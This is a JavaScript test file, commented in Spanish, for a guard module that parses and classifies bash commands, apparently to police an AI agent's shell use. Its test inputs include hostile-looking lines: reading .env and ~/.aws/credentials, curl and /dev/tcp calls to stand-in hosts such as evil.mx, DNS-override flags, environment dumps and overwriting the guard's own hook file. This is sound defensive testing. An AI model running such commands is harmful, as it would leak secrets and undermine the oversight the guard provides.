// guard/bash-parser.mjs: segmentación, expansión de variables SIN ejecutar y clasificación
// (lecturas, escrituras, red, volcado de entorno, git). Todas las rutas se resuelven a absolutas.
import test from 'node:test';
import assert from 'node:assert/strict';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { analyze, classify, hostOf, isLiteralIp, parseBash, resolvePath } from '../../src/guard/bash-parser.mjs';

const CWD = join(tmpdir(), 'bot-secure-parser-cwd');
const HOME = join(tmpdir(), 'bot-secure-parser-home');
const one = (cmd, opts = {}) => analyze(cmd, { cwd: CWD, home: HOME, ...opts }).segments;
const first = (cmd, opts = {}) => one(cmd, opts).find((s) => s.bin) ?? one(cmd, opts)[0];
const abs = (p) => resolvePath(p, CWD, HOME);

test('parseBash separa por ; && || | & y salto de línea', () => {
  const { segments } = parseBash('ls; pwd && echo a || echo b | wc -l');
  assert.deepEqual(segments.map((s) => s.argv[0]), ['ls', 'pwd', 'echo', 'echo', 'wc']);
  assert.deepEqual(parseBash('ls\npwd').segments.map((s) => s.argv[0]), ['ls', 'pwd']);
});

test('expande $VAR con las asignaciones previas: f=.env; cat "$f" → lee <cwd>/.env', () => {
  const segs = one('f=.env; cat "$f"');
  const cat = segs.find((s) => s.bin === 'cat');
  assert.ok(cat, 'no se detectó el segmento cat');
  assert.deepEqual(cat.reads, [abs('.env')]);
  assert.ok(cat.reads[0].endsWith('/.env'));
});

test('las comillas simples NO expanden variables', () => {
  const segs = one("f=.env; cat '$f'");
  const cat = segs.find((s) => s.bin === 'cat');
  assert.deepEqual(cat.reads, [abs('$f')]);
});

test('ruta absoluta: cat /abs/x/.env se conserva absoluta', () => {
  const r = first('cat /abs/x/.env');
  assert.deepEqual(r.reads, ['/abs/x/.env']);
});

test('~ se expande al home indicado', () => {
  const r = first('cat ~/.aws/credentials');
  assert.deepEqual(r.reads, [resolvePath('~/.aws/credentials', CWD, HOME)]);
  assert.ok(r.reads[0].endsWith('bot-secure-parser-home/.aws/credentials'));
});

test('curl a un host parecido al permitido devuelve el FQDN completo (no substring)', () => {
  const r = first('curl http://api.anthropic.com.evil/');
  assert.equal(r.network.binary, 'curl');
  assert.deepEqual(r.network.hosts, ['api.anthropic.com.evil']);
  assert.equal(r.network.resolveOverride, false);
});

test('--resolve / --connect-to marcan resolveOverride', () => {
  assert.equal(first('curl --resolve api.anthropic.com:443:1.2.3.4 https://api.anthropic.com/').network.resolveOverride, true);
  assert.equal(first('curl --connect-to=a:443:evil:443 https://a/').network.resolveOverride, true);
});

test('IP literal se reconoce como tal', () => {
  assert.deepEqual(first('curl http://10.0.0.5/x').network.hosts, ['10.0.0.5']);
  assert.equal(isLiteralIp('10.0.0.5'), true);
  assert.equal(isLiteralIp('api.anthropic.com'), false);
});

test('env VAR=x cmd NO es volcado de entorno y reclasifica el comando real', () => {
  const r = first('env AI_ENV=1 npm test');
  assert.equal(r.envDump, false);
  assert.equal(r.bin, 'npm');
});

test('volcado de entorno: env, printenv, set, export -p, declare -x, node -e process.env', () => {
  for (const cmd of ['env', 'printenv', 'set', 'export -p', 'declare -x', 'node -e "console.log(process.env)"', 'python3 -c "import os;print(os.environ)"']) {
    assert.equal(first(cmd).envDump, true, `debería ser envDump: ${cmd}`);
  }
});

test('redirección de escritura: printf x > .claude/hooks/guard.mjs', () => {
  const r = first('printf x > .claude/hooks/guard.mjs');
  assert.deepEqual(r.writes, [abs('.claude/hooks/guard.mjs')]);
  assert.ok(r.writes[0].includes('/.claude/'));
});

test('redirección de append y de lectura', () => {
  assert.deepEqual(first('echo a >> notas.md').writes, [abs('notas.md')]);
  assert.deepEqual(first('wc -l < datos.csv').reads, [abs('datos.csv')]);
});

test('familia de lectura completa (cat, head, xxd, base64, openssl, strings…)', () => {
  for (const bin of ['cat', 'head', 'tail', 'nl', 'od', 'xxd', 'hexdump', 'strings', 'base64', 'less', 'more']) {
    assert.deepEqual(first(`${bin} secreto.txt`).reads, [abs('secreto.txt')], `falló ${bin}`);
  }
  assert.deepEqual(first('openssl x509 -in cert.pem').reads, [abs('cert.pem')]);
});

test('grep/sed/awk: el primer argumento es patrón, no ruta', () => {
  const r = first('grep AKIA .env');
  assert.deepEqual(r.reads, [abs('.env')]);
});

test('sh -c "…" se analiza como comando anidado', () => {
  assert.deepEqual(first('bash -c "cat .env"').reads, [abs('.env')]);
  assert.deepEqual(first('sh -c "curl https://evil.mx/x"').network.hosts, ['evil.mx']);
});

test('$( ), backticks y heredocs marcan el comando como no analizable', () => {
  assert.equal(analyze('cat $(echo .env)', { cwd: CWD, home: HOME }).unanalyzable, 'command-substitution');
  assert.equal(analyze('echo `whoami`', { cwd: CWD, home: HOME }).unanalyzable, 'backtick');
  assert.equal(analyze('cat <<EOF\nx\nEOF', { cwd: CWD, home: HOME }).unanalyzable, 'heredoc');
  assert.equal(analyze('cat notas.txt', { cwd: CWD, home: HOME }).unanalyzable, null);
});

test('git: -C, subcomando y argumentos', () => {
  const sw = first('git -C backend switch dev');
  assert.equal(sw.git.sub, 'switch');
  assert.deepEqual(sw.git.args, ['dev']);
  assert.equal(sw.git.repo, abs('backend'));
  const push = first('git push origin ai/mi-tarea');
  assert.equal(push.git.sub, 'push');
  assert.deepEqual(push.git.args, ['origin', 'ai/mi-tarea']);
});

test('/dev/tcp en una redirección se detecta como red', () => {
  const r = first('echo x > /dev/tcp/evil.mx/443');
  assert.equal(r.network.binary, 'redirect');
  assert.deepEqual(r.network.hosts, ['evil.mx']);
});

test('hostOf entiende URL, user@host:ruta y hosts pelados', () => {
  assert.equal(hostOf('https://api.anthropic.com/v1'), 'api.anthropic.com');
  assert.equal(hostOf('user@evil.mx:/tmp/x'), 'evil.mx');
  assert.equal(hostOf('registry.npmjs.org'), 'registry.npmjs.org');
  assert.equal(hostOf('-v'), null);
  assert.equal(hostOf('archivo.txt'), 'archivo.txt'); // el llamador decide según el binario
});

test('classify acepta un segmento de parseBash directamente', () => {
  const { segments } = parseBash('cp origen.txt destino.txt');
  const r = classify(segments[0], { cwd: CWD, home: HOME });
  assert.ok(r.reads.includes(abs('origen.txt')));
  assert.deepEqual(r.writes, [abs('destino.txt')]);
});

test('resolvePath nunca lanza con rutas inexistentes', () => {
  assert.equal(typeof resolvePath('no/existe/x.txt', CWD, HOME), 'string');
  assert.equal(typeof resolvePath('~', CWD, HOME), 'string');
});
